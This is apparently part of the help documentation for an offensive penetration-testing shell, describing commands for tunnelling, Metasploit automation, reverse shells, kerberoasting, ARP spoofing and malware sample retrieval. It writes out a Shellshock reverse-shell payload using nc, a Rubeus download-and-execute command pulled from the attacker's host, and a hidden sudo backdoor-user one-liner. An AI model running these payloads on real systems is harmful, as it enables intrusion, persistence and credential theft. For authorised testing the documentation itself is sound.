1. Checks if an argument is provided:
- If no argument is given, displays an error message indicating the need to pass a hash type.

2. Executes a command to search for hash types:
- Runs `hashcat -h` to display Hashcat help information and pipes it to `grep` to search for the provided argument.
- Prints a message with the command being executed and provides further instructions for running Hashcat.

3. Prints a message suggesting the next step:
- Provides a suggestion for running Hashcat with the found hash types.

:param line: The hash type or keyword to search for in the Hashcat help output.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Run `hashcat -h` to display the help information.
- Use `grep` to search for the specific hash type or keyword within the help output.
- Run Hashcat with the appropriate parameters based on the search results.

Note: Ensure that `hashcat` is installed and accessible in the system's PATH.

## clean
Deletes files and directories in the `sessions` directory, excluding specified files and directories.

1. Checks if the `rhost` parameter is valid:
- Uses the `check_rhost` function to verify if `rhost` is set and valid.
- If `rhost` is not valid, exits the function.

2. Lists files and directories in the `sessions` directory:
- Uses `os.listdir` to list all files and directories in the `sessions` directory.
- Compares each item with the list of exclusions.

3. Deletes files and directories not in the exclusion list:
- Uses `os.remove` to delete files and `shutil.rmtree` to delete directories.

4. Prints a message indicating that the cleanup is complete.

:param line: This parameter is not used in the function.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Ensure that you have the correct `rhost` value set.
- Manually execute commands to delete files and directories, excluding specified ones.

Note: This function performs a cleanup by removing various files and directories associated with the current session, excluding specified items.

## pyautomate
Automates the execution of pwntomate tools on XML configuration files.

1. Sets the directory for XML files to be processed:
- Checks the `sessions` directory for XML files.

2. For each XML file found:
- Constructs and executes a command to run `pwntomate` with the XML file as input.
- The command is executed using `subprocess.run`, and errors are handled if the command fails.

3. After processing all XML files:
- Prints a message indicating that the target has been pwntomated.

:param line: This parameter is not used in the function.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Ensure that XML configuration files are present in the `sessions` directory.
- Run `pwntomate.py` manually on each XML file using a similar command format.

Note: This function assumes that `pwntomate.py` is available in the current working directory and is executable with Python 3.

## aliass
Prints all configured aliases and their associated commands.

1. Retrieves the list of aliases from the `LazyOwnShell` instance:
- Iterates through each alias and its associated command.

2. For each alias:
- Displays the alias name and the full command it represents.

:param line: This parameter is not used in the function.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Ensure that aliases are configured in the `LazyOwnShell` instance.
- Manually review the aliases and their commands as displayed.

Note: This function assumes that aliases are managed by the `LazyOwnShell` instance and are available for retrieval.

## tcpdump_icmp
Starts `tcpdump` to capture ICMP traffic on the specified interface.

1. Checks if the `line` argument (interface) is provided:
- Displays an error message and exits if the interface is missing.

2. If the interface is provided:
- Displays the `tcpdump` command that will be executed.
- Runs the `tcpdump` command to capture ICMP traffic on the specified interface.

:param line: The network interface on which to capture ICMP traffic (e.g., `tun0`).
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Provide a valid network interface for capturing ICMP traffic.
- Execute the `tcpdump` command manually to capture ICMP traffic on the specified interface.

Note: Ensure that you have sufficient permissions to run `tcpdump` on the specified interface.

## tcpdump_capture
Starts packet capture using `tcpdump` on the specified interface.

1. Checks if the `line` argument (interface) is provided:
- Displays an error message and exits if the interface is missing.

2. Validates the `rhost` (remote host IP):
- Exits the function if the `rhost` is not valid.

3. If the interface and `rhost` are valid:
- Displays the `tcpdump` command that will be executed.
- Runs the `tcpdump` command to capture packets on the specified interface and save the capture file to `pcaps/capture_<rhost>.pcap`.

:param line: The network interface on which to capture packets (e.g., `tun0`).
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Provide a valid network interface for capturing packets.
- Ensure the remote host IP is set correctly.
- Execute the `tcpdump` command manually to capture packets on the specified interface.

Note: Ensure that the `pcaps` directory exists and is writable for saving the capture file.

## tshark_analyze
Analyzes a packet capture file using `tshark` based on the provided remote host IP.

1. Checks if the `rhost` (remote host IP) is valid:
- Displays an error message and exits if the `rhost` is not valid.

2. Verifies the existence of the packet capture file:
- Displays an error message and exits if the capture file is missing.
- Prompts the user to run the `do_tcpdump_capture` command first.

3. If the capture file exists:
- Displays the `tshark` command that will be executed.
- Runs the `tshark` command to analyze the packet capture file and print out IP destination and frame time fields.

:param line: The command line input specifying the interface for capturing packets.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Ensure the remote host IP is valid.
- Run the `do_tcpdump_capture` command to capture packets.
- Execute the `tshark` command manually to analyze the packet capture file.

Note: Ensure that the capture file `pcaps/capture_<rhost>.pcap` is available in the `pcaps` directory.

## rdp
Reads credentials from a file, encrypts the password, and executes the RDP connection command.

1. Reads credentials:
    - Reads the username and password from the `sessions/credentials.txt` file.

2. Encrypts the password:
    - Uses `remmina --encrypt-password` to encrypt the password obtained from the file.

3. Executes the RDP connection command:
    - Uses the encrypted password to construct and execute the `remmina -c` command to initiate the RDP connection.

:param line: This function does not use any arguments.
:type line: str
:returns: None

Manual execution:
To manually execute the command:
- Ensure `sessions/credentials.txt` contains the credentials in the format `username:password`.
- Run the `rdp` command to read the credentials, encrypt the password, and connect to the RDP server.
Example usage: `rdp`

## base64encode
Encodes a given string into Base64 format.

1. Encodes the input string:
    - Uses the `base64` library to encode the provided string into Base64 format.

2. Displays the encoded string:
    - Prints the Base64 encoded string to the terminal.

:param line: The string to encode in Base64 format.
:type line: str
:returns: None

Manual execution:
To manually encode a string in Base64:
- Provide the string to the command and it will print the Base64 encoded result.
Example usage: `base64encode HelloWorld`

## base64decode
Decodes a Base64 encoded string.

1. Decodes the Base64 string:
    - Uses the `base64` library to decode the provided Base64 encoded string back to its original form.

2. Displays the decoded string:
    - Prints the decoded string to the terminal.

:param line: The Base64 encoded string to decode.
:type line: str
:returns: None

Manual execution:
To manually decode a Base64 encoded string:
- Provide the Base64 encoded string to the command and it will print the decoded result.
Example usage: `base64decode SGVsbG9Xb3JsZA==`

## grisun0
Creates and copies a shell command to add a new user `grisun0`, set a password, add the user to the sudo group, and switch to the user.

1. Displays the command:
    - Prints the command to add the user `grisun0` with home directory `/home/.grisun0`, set the password, add the user to the `sudo` group, set the appropriate permissions, and switch to the user.

2. Copies the command to clipboard:
    - Uses `xclip` to copy the command to the clipboard for easy pasting.

:param line: This function does not use any arguments.
:type line: str
:returns: None

Manual execution:
To manually execute the command:
- Copy the command from the clipboard.
- Run it in a terminal to create the user and set up the permissions as specified. useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0
Note: Ensure `xclip` is installed and available on your system.

## winbase64payload
Creates a base64 encoded payload specifically for Windows to execute a PowerShell command or download a file using `lhost`.

1. Checks if `lhost` is set:
    - Displays an error message and exits if `lhost` is not set.

2. Checks if a file name or command is provided:
    - Displays an error message and exits if no file name or command is provided.

3. Prompts for the type of payload:
    - '1': Constructs a PowerShell command to download and execute a `.ps1` script from `lhost`.
    - '2': Constructs a command to download a file using `wget`.

4. Prompts for the output type:
    - '1': Outputs the base64 encoded PowerShell command.
    - '2': Outputs the base64 encoded command in an ASP format.
    - '3': Outputs the base64 encoded command in a PHP format.

5. Encodes the command:
    - Converts the command to UTF-16LE encoding.
    - Encodes the UTF-16LE encoded command to base64.
    - Copies the final base64 command to the clipboard using `copy2clip`.

:param line: The name of the `.ps1` file or the command to be executed.
:type line: str
:returns: None

Manual execution:
To manually use the payload:
- Ensure `lhost` is set to the correct IP address.
- Place the `.ps1` file in the `sessions` directory if using the 'ps1' payload type.
- Use `copy2clip` to copy the generated base64 command to the clipboard.

Note: Ensure `iconv`, `base64`, and `xclip` are installed and available on your system.

## revwin
Creates a base64 encoded PowerShell reverse shell payload specifically for Windows to execute a `.ps1` script from `lhost`.

1. Checks if `lhost` and `lport` are set and valid:
    - Uses `check_lhost(lhost)` to verify the `lhost` parameter.
    - Uses `check_lport(lport)` to verify the `lport` parameter.
    - Exits the function if either `lhost` or `lport` is invalid.

2. Constructs a PowerShell reverse shell command with the following structure:
    - Connects to the specified `lhost` and `lport` using `TCPClient`.
    - Reads data from the TCP stream, executes it, and sends back the results.
    - Appends the current path to the response for interactive use.

3. Encodes the PowerShell command:
    - Encodes the command in UTF-16LE.
    - Converts the UTF-16LE encoded command to base64.
    - Creates a PowerShell command that executes the base64 encoded payload.

4. Copies the final PowerShell command to the clipboard:
    - Uses `xclip` to copy the command to the clipboard.

:param line: This parameter is not used in the function but is present for consistency with the method signature.
:type line: str
:returns: None

Manual execution:
To manually use the payload:
- Ensure `lhost` and `lport` are correctly set.
- Use `xclip` to copy the generated PowerShell command to the clipboard.

Note: Ensure `xclip` is installed and available on your system.

## asprevbase64
Creates a base64 encoded ASP reverse shell payload and copies it to the clipboard.

1. Checks if a base64 encoded payload is provided:
    - If no payload is provided, displays an error message and exits the function.

2. If a payload is provided:
    - Creates an ASP script that uses `WScript.Shell` to execute a PowerShell command encoded in base64.
    - The created ASP script writes the result of the PowerShell command to the response output.
    - Uses `xclip` to copy the ASP script to the clipboard with the provided base64 encoded payload.

:param line: The base64 encoded payload to be used in the ASP reverse shell.
:type line: str
:returns: None

Manual execution:
To manually create the ASP payload:
- Ensure you have the base64 encoded payload ready.
- Use `xclip` to copy the provided command to the clipboard.

Note: Ensure `xclip` is installed and available on your system. For help on creating the base64 encoded payload, see `help winbase64payload`.

## rubeus
Copies a command to the clipboard for downloading and running Rubeus.

1. Checks if `lhost` (local host IP) is set:
    - If `lhost` is not set, displays an error message and exits the function.

2. If `lhost` is set:
    - Displays a message indicating that the Rubeus downloader command has been copied to the clipboard.
    - The copied command downloads Rubeus from the specified `lhost` and saves it as `Rubeus.exe`.
    - Uses `xclip` to copy the following command to the clipboard:
    - `iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\Rubeus.exe kerberoast /creduser:domain.local\usuario /credpassword:password`

:param line: Not used in this function.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Ensure that `lhost` is set correctly.
- Use `xclip` to copy the provided command to the clipboard.
- Execute the downloaded Rubeus executable with the provided arguments.

Note: Ensure `xclip` is installed and available on your system.

## socat
Sets up and runs a `socat` tunnel with SOCKS4A proxy support.

1. If no `line` (IP:port) argument is provided:
    - Displays an error message indicating the need to pass `ip:port`.
    - Exits the function.

2. Displays a message instructing the user to configure `socks5` at `127.0.0.1:1080` in `/etc/proxychains.conf`.

3. If a valid `line` argument is provided:
    - Displays the command being run: `socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080`.
    - Executes the `socat` command to listen on port 1080 and forward traffic to the specified IP and port using SOCKS4A proxy.
    - Prints a shutdown message for the `socat` tunnel at port 1080.

:param line: The IP and port (formatted as `ip:port`) to forward traffic to through the SOCKS4A proxy.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Configure the `socks5` proxy settings in `/etc/proxychains.conf`.
- Use the `socat` command with appropriate IP and port.

Note: Ensure that `socat` is installed and properly configured on your system.

## chisel
Automates the setup and execution of Chisel server and client for tunneling and port forwarding.

1. If no `lhost` (local host IP) is set:
    - Displays an error message indicating the need to set `lhost` using the `set` command.
    - Exits the function.

2. If no port argument is provided:
    - Displays an error message indicating the need to provide a port number.
    - Exits the function.

3. If required Chisel files are not present:
    - Displays an error message prompting the user to run the `download_resources` command.
    - Exits the function.

4. If a valid port is provided:
    - Displays usage instructions for the Linux and Windows payloads.
    - Constructs and copies the appropriate Chisel command to the clipboard based on user choice (1 for Windows, 2 for Linux).
    - Extracts and sets up Chisel binaries for Linux and Windows from compressed files.
    - Runs the Chisel server on the specified port and prints a shutdown message.

:param line: The command line input containing the port number for Chisel setup.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Ensure `lhost` is set using `set lhost <IP>`.
- Provide the port number when calling the function.
- Run the command `download_resources` if the Chisel files are missing.
- Manually execute the Chisel commands for Linux or Windows as copied to the clipboard.

Note: Ensure that all required files (`chisel_1.9.1_linux_amd64.gz` and `chisel_1.9.1_windows_amd64.gz`) are available in the `sessions` directory.

## msf
Automates various Metasploit tasks including scanning for vulnerabilities, setting up reverse shells, and creating payloads.

1. If no arguments are provided:
    - Retrieves the target IP (`rhost`) from parameters.
    - Checks if the IP is valid using `check_rhost()`. If invalid, exits the function.
    - Creates a Metasploit resource script (`/tmp/scan_vulnerabilities.rc`) that includes commands for scanning ports, enumerating services, and checking for known vulnerabilities.
    - Executes Metasploit with the created resource script and then deletes the temporary file.
    - Prints a shutdown message after running the scan.

2. If the argument starts with "rev":
    - Sets up a reverse shell payload based on the specified platform and user choice (with or without meterpreter).
    - Creates a Metasploit resource script (`/tmp/handler.rc`) for handling incoming reverse shell connections.
    - Executes Metasploit with the created resource script and then deletes the temporary file.
    - Prints a shutdown message after setting up the handler.

3. If the argument starts with "lnk":
    - Configures parameters (`lhost`, `lport`) for creating a payload.
    - Uses `msfvenom` to generate a payload executable and saves it in the `sessions` directory.
    - Creates an XML file (`download_payload.xml`) that will be used to download and execute the payload on a target machine.
    - Creates a PowerShell script (`create_lnk.ps1`) to generate a shortcut file (`.lnk`) pointing to the payload.
    - Prints instructions and generates a command to copy to the clipboard for setting up the payload and files.

4. If the argument starts with "autoroute":
    - Configures parameters for setting up a Metasploit session and autorouting.
    - Creates a Metasploit resource script (`/tmp/autoroute.rc`) to handle exploit sessions and set up autorouting.
    - Executes Metasploit with the resource script and starts a SOCKS proxy for routing traffic.
    - Configures proxychains to use the Metasploit SOCKS proxy and prints instructions for using proxychains with tools.

:param line: The command line input that determines which Metasploit task to automate.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- For scanning: Create and run the resource script using `msfconsole -r /tmp/scan_vulnerabilities.rc`.
- For reverse shells: Configure and run the resource script with the appropriate payload settings.
- For payload generation and shortcuts: Use `msfvenom` and create XML and PowerShell scripts as specified.
- For autorouting: Create and run the resource script for autorouting and configure proxychains.

Note: Ensure all required parameters (`lhost`, `lport`, etc.) are set before running these tasks.

## encrypt
Encrypts a file using XOR encryption.

1. Splits the provided `line` into `file_path` and `key` arguments.
2. Checks if the correct number of arguments (2) is provided; if not, prints an error message and returns.
3. Reads the file specified by `file_path`.
4. Encrypts the file contents using the `xor_encrypt_decrypt` function with the provided `key`.
5. Writes the encrypted data to a new file with the ".enc" extension added to the original file name.
6. Prints a message indicating the file has been encrypted.
7. Catches and handles the `FileNotFoundError` exception if the specified file does not exist, and prints an error message.

:param line: A string containing the file path and the key separated by a space.
:type line: str
:returns: None

Manual execution:
To manually run this command, use the following syntax:
    encrypt <file_path> <key>
Replace `<file_path>` with the path to the file to be encrypted and `<key>` with the encryption key.

## decrypt
Decrypts a file using XOR encryption.

1. Splits the provided `line` into `file_path` and `key` arguments.
2. Checks if the correct number of arguments (2) is provided; if not, prints an error message and returns.
3. Reads the encrypted file specified by `file_path`.
4. Decrypts the file contents using the `xor_encrypt_decrypt` function with the provided `key`.
5. Writes the decrypted data to a new file by removing the ".enc" extension from the original file name.
6. Prints a message indicating the file has been decrypted.
7. Catches and handles the `FileNotFoundError` exception if the specified file does not exist, and prints an error message.

:param line: A string containing the file path and the key separated by a space.
:type line: str
:returns: None

Manual execution:
To manually run this command, use the following syntax:
    decrypt <file_path> <key>
Replace `<file_path>` with the path to the encrypted file and `<key>` with the decryption key.

## get_output
Devuelve la salida acumulada

## sessionssh
Ejecuta un comando para listar las conexiones SSH activas.

Este método utiliza `netstat` para mostrar las conexiones establecidas (`ESTAB`) y filtra los resultados para mostrar solo las conexiones SSH. 

Parámetros:
- line: Parámetro no utilizado en esta función.

Returns:
- None

Ejemplos:
>>> do_sessionssh("")
(Muestra en consola las conexiones SSH activas)

## sessionsshstrace
Attach strace to a running process and log output to a file.

This function attaches `strace` to a process specified by its PID,
tracing system calls related to writing data. The output of `strace`
is saved to a file named `strace.txt` in the `sessions` directory.

Parameters:
- line (str): The PID of the process to attach strace to.

Raises:
- ValueError: If the `line` parameter is empty.
- FileNotFoundError: If `strace` is not installed.

Example:
- `sessionsshstrace 666`: Attach strace to process with PID 666.

Notes:
- Ensure the `sessions` directory exists or is created before running the command.
- The command redirects both stdout and stderr to the `strace.txt` file.

## lazyscript
Executes commands defined in a lazyscript file.

This function reads a script file containing commands to be executed
sequentially. Each command is executed using the onecmd method of the 
cmd.Cmd class. The script file should be located in the 'lazyscripts' 
directory relative to the current working directory.

Args:
    line (str): The name of the script file to execute (e.g., 'lazyscript.ls').

Example:
    do_lazyscript('example_script.ls')
    This would execute all commands listed in 'lazyscripts/example_script.ls'.

## set_proxychains
Relanza la aplicación actual utilizando `proxychains` para enrutar el tráfico
a través de los proxies configurados.

Este comando reinicia la aplicación desde el principio utilizando un script
bash externo llamado `run`, que se encarga de configurar el entorno 
(como activar un entorno virtual) y luego ejecutar la aplicación Python. 
El comando `proxychains` se utiliza para asegurar que cualquier comando 
ejecutado dentro de la aplicación, como `nmap`, sea encaminado a través 
de los proxies especificados en la configuración de `proxychains`.

Pasos realizados por esta función:
1. Obtiene la ruta al script `run`.
2. Relanza el script `run` bajo `proxychains` utilizando `subprocess.run`.
3. Sale de la instancia actual de la aplicación para evitar duplicación.

Args:
    line (str): No se utiliza en este comando, pero se incluye como parte 
                de la interfaz estándar de `cmd`.

## shellcode
Generates a Python one-liner to execute shellcode from a given URL.

This function:
1. Retrieves the local host (lhost) from the parameters.
2. Checks if the local host is valid.
3. Verifies the existence of the `shellcode.bin` file in the expected directory.
4. Constructs a Python one-liner command that:
    - Fetches the shellcode from the specified URL.
    - Decodes the base64-encoded shellcode.
    - Creates a buffer in memory for the shellcode.
    - Casts the buffer to a function pointer.
    - Executes the shellcode.
5. Copies the generated command to the clipboard for easy execution.

## skipfish
This function executes the web security scanning tool Skipfish 
using the provided configuration and parameters. It allows 
scanning a specified target (rhost) and saves the results 
in a designated output directory.

Parameters:
- self: Refers to the instance of the class in which this function is defined.
- line: A string that may contain additional options to modify the scanning behavior.

Function Flow:
1. Default values are set for the target IP (rhost), port (port), and output directory (outputdir).
2. The validity of the target (rhost) is checked using the `check_rhost` function.
3. If no argument is provided in `line`, a `skipfish` command is constructed using the default values.
4. If `line` starts with 'url', the URL configured in `self.params['url']` is retrieved and used to construct the `skipfish` command.
5. If the URL is not configured and an attempt is made to use the 'url' option, an error message is printed, and the function exits.
6. The constructed `skipfish` command is displayed on the console and executed using `os.system`.

Note:
- The function assumes that the `skipfish` tool is installed on the system.
- The output of the scan is saved in the directory `sessions/{rhost}/skipfish/`.
- The wordlist used by Skipfish is specified in `wordlist`.

## createdll
Create a Windows DLL file using MinGW-w64 or a Blazor DLL for Linux.

This function prompts the user to select between creating a 32-bit DLL, 
a 64-bit DLL, or a Linux Blazor DLL. It first checks if MinGW-w64 is installed; 
if not, it attempts to install it. The user must provide a filename for the 
DLL, which will be created from the `sessions/rev.c` source file. 
The function constructs the appropriate command to compile the DLL based on 
the user's choice and executes it. If the user selects a 32-bit or 64-bit 
compilation, the function also opens the `rev.c` file in a text editor for 
modifications before compilation. For option 3, it executes a script to create 
a Blazor DLL using the local host (lhost) address to download the necessary payload.

Parameters:
- line (str): The name of the DLL file to be created.
            Must be provided by the user.

Usage:
- Choose "1" for 32-bit, "2" for 64-bit, or "3" for creating a Linux Blazor DLL.
- Ensure that shellcode is created beforehand using 
the `lazymsfvenom` or `venom` options 13 or 14 
to replace in `sessions/rev.c`.

## seo
Performs a web seo fingerprinting scan using `lazyseo.py`.

1. Executes the `lazyseo.py` command to identify h1,h2,links,etc used by the target web application.

:param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
:param rhost: The target web host to be scanned, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually perform web seo fingerprinting, use the following command:
    lazyseo.py <target_host>

Replace `<target_host>` with the URL or IP address of the web application you want to scan.

For example:
    lazyseo.py example.com

## padbuster
Execute the PadBuster command for padding oracle attacks.

This function constructs and executes a PadBuster command to perform
a padding oracle attack on the specified URL. It requires the user
to provide a URL, a cookie with a hash, a plaintext value to compare, 
and a specific byte position to attack.

Parameters:
- line (str): The input line containing the cookie, plaintext, and byte 
            position. Expected format: 'cookie=<HASH> plaintext <byte_position>'.

Functionality:
- The function first checks if a URL is set in the parameters.
- It then validates that the correct number of arguments is provided.
- If the arguments are valid, it constructs the PadBuster command and executes it.
- The command is also copied to the clipboard for convenience.

Usage Example:
- set url http://target.com
- padbuster auth=<HASH> user=admin 8

## smbattack
Scans for hosts with SMB service open on port 445 in the specified target network.

This function performs the following actions:
1. Scans the specified subnet for hosts with an open SMB port (445).
2. Sets up a Metasploit handler to listen for reverse connections.
3. Attempts to exploit the Conficker vulnerability on each identified host.
4. Optionally conducts a brute-force attack on SMB using the provided password file.

Parameters:
line (str): The command line input for the smbattack function, 
            though not used directly in this implementation.

Returns:
None

## cacti_exploit
Automates the exploitation of the Cacti version 1.2.26 vulnerability 
using the multi/http/cacti_package_import_rce exploit.

This function performs the following actions:
1. Sets up a Metasploit handler to listen for reverse connections.
2. Attempts to log in to the Cacti instance with provided credentials.
3. Checks if the target is vulnerable and uploads the malicious payload.
4. Triggers the payload to obtain a Meterpreter session.

Parameters:
line (str): The command line input for the cacti exploit function, 
            though used directly in this implementation to set password.

Returns:
None

## smalldic
Handles the creation of temporary files for users and passwords based on a small dictionary.

This function prompts the user to decide whether to use a small dictionary for generating 
user and password lists. If the user agrees, it loads the credentials from a JSON file and 
writes them into temporary files. If the user declines, the process is aborted.

Parameters:
list (str): Not used in this function, but kept for compatibility with cmd command input.

Returns:
None

## ngrok
Set up and run ngrok on a specified local port. If ngrok is not installed, it will
automatically be installed. The user will be prompted to provide their ngrok
authentication token to complete the setup.

Args:
    line (str): The input line, though it's not directly used in this function.

Workflow:
1. Check if the local port specified in `self.params["lport"]` is valid.
2. Verify if ngrok is installed. If not, proceed with installation.
3. After installation, prompt the user to authenticate ngrok using their token.
4. Once authenticated, run ngrok to expose the specified local port.

Note:
    The ngrok authentication token can be obtained from the ngrok dashboard.

## wifipass
This function generates a PowerShell script that retrieves saved Wi-Fi passwords on a Windows system.
The script gathers the Wi-Fi profiles, extracts their passwords, and saves the information in a text file
named 'wifi_passwords.txt' in the directory where the script is executed. The generated PowerShell command
is copied to the clipboard for easy execution.

Parameters:
line (str): This parameter is not used within the function but is required for the command interface.

The function does not return any value.

## shellshock
Executes a Shellshock attack against a target.

This function constructs and sends a specially crafted HTTP request designed to exploit 
the Shellshock vulnerability on a target server. The payload is embedded in the 
'User-Agent' header, and when executed, it will open a reverse shell connection to 
the attacker's machine.

Parameters:
- lport: Local port for the reverse shell connection, retrieved from self.params.
- lhost: Local host for the reverse shell connection, retrieved from self.params.

The function first validates the local host (lhost) and local port (lport) using 
check_lhost() and check_lport(). If either validation fails, the function returns 
without proceeding.

If the validation passes, the payload is created using the format:
'() { :; }; /bin/bash -c "nc -v {rhost} {lport} -e /bin/bash -i"',
where rhost is the remote target's IP address and lport is the specified local port.

The function then attempts to send a GET request to the target URL (args.target) 
with the crafted payload in the 'User-Agent' header. The server's response is captured 
and printed using print_msg().

If any error occurs during the request, an error message is displayed using print_error().

Returns:
None

## powerserver
This function generates a PowerShell script that retrieves reverse shell over http on a Windows system.
The script generated PowerShell reverse shell to execute command by curl command
is copied to the clipboard for easy execution.

Parameters:
line (str): This parameter is used to get the port to create the listener

The function does not return any value.
Example of use: curl -X POST http://victim:8080/ -d "Get-Process"

## morse
Interactive Morse Code Converter.

This function serves as an interface for converting text to Morse code and vice versa. 
It provides a menu with the following options:

1️⃣  Convert text to Morse code.
2️⃣  Convert Morse code to text.
0️⃣  Exit the program.

When the function is called, it runs an external script (`morse.py`) that handles 
the conversion processes. The function also manages keyboard interruptions 
gracefully, allowing the user to exit the program cleanly.

Arguments:
line (str): This argument is reserved for future enhancements but is currently not used.

Returns:
None

Notes:
- Ensure that the `morse.py` module is located in the `modules` directory and is executable.
- The function captures `KeyboardInterrupt` to allow safe exit from the Morse code converter.

Example:
>>> do_morse("")

See Also:
- `morse.py`: The script that contains the logic for Morse code conversions.

## waybackmachine
Fetch URLs from the Wayback Machine for a given website.
The URL is taken from line. If the URL is not provided, an error is printed.
The limit of results is taken from self.params["limit"] if provided; otherwise, defaults to 10.
Results are printed directly to the console.

## c2
Handles the execution of a C2 (Command and Control) server setup command.

This function performs the following tasks:
1. Retrieves and validates the local host (lhost) and local port (lport) parameters.
2. Checks if the required file `modules/run` exists.
3. Reads the content of the `modules/run` file, replaces placeholders with actual values (lport, line, lhost), 
and copies the updated content to the clipboard.
4. Prompts the user to start the C2 server, and if confirmed, executes the server command.
5. Provides a warning about shutting down the server.

Args:
    line (str): The victim ID or command line to be used by the C2 server.

Returns:
    None

Raises:
    None

Example:
    c2 victim-1

Notes:
    - Ensure that the `lhost` and `lport` parameters are valid before calling this function.
    - The `modules/run` file must exist and be correctly formatted.
    - The server command is executed using `os.system`, which may require additional handling for security.

## kick
Handles the process of sending a spoofed ARP packet to a specified IP address with a given MAC address.

This function performs the following steps:
1. Executes a command to list current ARP entries and prints the IP and MAC addresses.
2. Prompts the user to input the target IP and MAC address in a specified format.
3. Parses the provided input to extract the IP and MAC addresses.
4. Sets up default values for the gateway IP, local MAC address, and network interface.
5. Creates an ARP packet with the specified target IP and MAC address.
6. Sends the ARP packet using the specified network interface.
7. Prints a confirmation message indicating that the spoofing packet has been sent.

Args:
    line (str): Input line for the command, which is not used directly in this function.

Raises:
    Exception: If any error occurs during the execution of the function.

## sqli
Asks the user for the URL, database, table, and columns, and then executes the Python script 
'modules/lazybsqli.py' with the provided parameters.

Parameters:
- def_func: Function to execute (not used in this example).
- line: Command line or additional input (not used in this example).

Example:
- do_bsqli(None, None)

## sshkey
Generates an SSH key pair with RSA 4096-bit encryption. If no name is provided, it uses 'lazyown' by default.
The keys are stored in the 'sessions/' directory.

Parameters:
- line: The name of the key file. If empty, 'lazyown' is used as the default.

Example:
- do_sshkey(None)  # Generates 'lazyown' key
- do_sshkey("custom_key")  # Generates 'custom_key' key

## crunch
Generate a custom dictionary using the `crunch` tool.

This function creates a wordlist with a specified length using the `crunch` command. 
It allows the user to specify a custom character pattern for the wordlist.

:param line: The length of the strings to be generated (e.g., '6' for 6-character strings).
            If not provided, the function will prompt an error message.

:returns: None

Example usage:
>>> crunch 6
This will generate a wordlist with all possible combinations of 6-character strings using the default pattern.

Additional notes:
- If no custom pattern is provided, the function uses a default pattern: "0123456789abcdefghijklmnñopqrstuvxyz,.-#$%@"
- The output is saved in the `sessions/` directory with the filename format `dict_<length>.txt`

## malwarebazar
Fetches and displays malware information from the MalwareBazaar API based on the given tag.

Args:
    line (str): The tag used to query the MalwareBazaar API.

This function performs the following steps:
1. Constructs a URL to query the MalwareBazaar API with the provided tag.
2. Uses `curl` to send a POST request to the API and saves the response in a JSON file.
3. Checks if the file was successfully created and exists.
4. Loads the JSON data from the file.
5. Checks the `query_status` field to determine if there are results.
    - If `no_results`, prints a warning message and exits the function.
6. Iterates through the list of file information provided in the response.
    - Prints detailed information about each file, including:
        - File name
        - File type
        - File size
        - Hashes (SHA-256, SHA-1, MD5)
        - First seen date
        - Signature
        - Tags
        - ClamAV results (if any)
        - Downloads and uploads count
7. Deletes the temporary file used to store the API response.

Returns:
    None

## download_malwarebazar
Download a malware sample from MalwareBazaar using its SHA256 hash.

This function allows the user to download a malware sample from MalwareBazaar by providing 
the SHA256 hash of the desired file. If the hash is not provided as an argument, the function 
will prompt an error message indicating the correct usage. The downloaded malware sample 
will be saved as a zipped file (`malware.zip`) and will be password protected.

Arguments:
line (str): The SHA256 hash of the malware sample to be downloaded.

Returns:
None

Example:
>>> download_malwarebazar 094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d

Notes:
- Ensure that the SHA256 hash provided is correct and that it corresponds to a file available 
on MalwareBazaar.
- The downloaded file will be password protected using the password "infected".
- To obtain the SHA256 hash of malware samples, refer to the `help malwarebazar` command.

See Also:
- `run(command)`: Utility function used to execute the command for downloading the malware.

## sslscan
Run an SSL scan on the specified remote host.

This function initiates an SSL scan on a specified remote host (`rhost`)
using the `sslscan-singleip.sh` script. If a specific port is provided in the
`line` argument, the scan will target that port; otherwise, it will scan
all available ports.

Parameters:
line (str): The port number to scan (optional). If omitted, the scan will target all ports.

Internal Variables:
rhost (str): The remote host IP address or hostname extracted from the `params` attribute.

Returns:
None

Example Usage:
- To scan all ports on the specified `rhost`: `sslscan`
- To scan a specific port (e.g., port 443) on `rhost`: `sslscan 443`

Note:
- The `check_rhost()` function is used to validate the `rhost` before running the scan.
- The `sslscan-singleip.sh` script must be present in the `sessions` directory.

## cewl
This function constructs and executes a command for the 'cewl' tool.
It first checks if the 'url' parameter is set. If not, it prints an error message.
If the 'url' is set, it extracts the domain from the URL using the get_domain function.
Then, it constructs a 'cewl' command with the specified parameters and prepares it for execution.

Scan to a depth of 2 (-d 2) and use a minimum word length of 5 (-m 5), save the words to a file (-w docswords.txt), targeting the given URL (https://example.com):

Parameters:
line (str): The command line input for this function.

Expected self.params keys:
- url (str): The URL to be used for the 'cewl' command.

Example usage:
- set url http://example.com
- do_cewl

## dmitry
This function constructs and executes a command for the 'dmitry' tool.
It first checks if the 'url' parameter is set. If not, it prints an error message.
If the 'url' is set, it extracts the domain from the URL using the get_domain function.
Then, it constructs a 'dmitry' command with the specified parameters and prepares it for execution.

Run a domain whois lookup (w), an IP whois lookup (i), retrieve Netcraft info (n), search for subdomains (s), search for email addresses (e), do a TCP port scan (p), and save the output to example.txt (o) for the domain example.com:

Parameters:
line (str): The command line input for this function.

Expected self.params keys:
- url (str): The URL to be used for the 'dmitry' command.

Example usage:
- set url http://example.com
- do_dmitry

## graudit
Executes the graudit command to perform a static code analysis with the specified options.

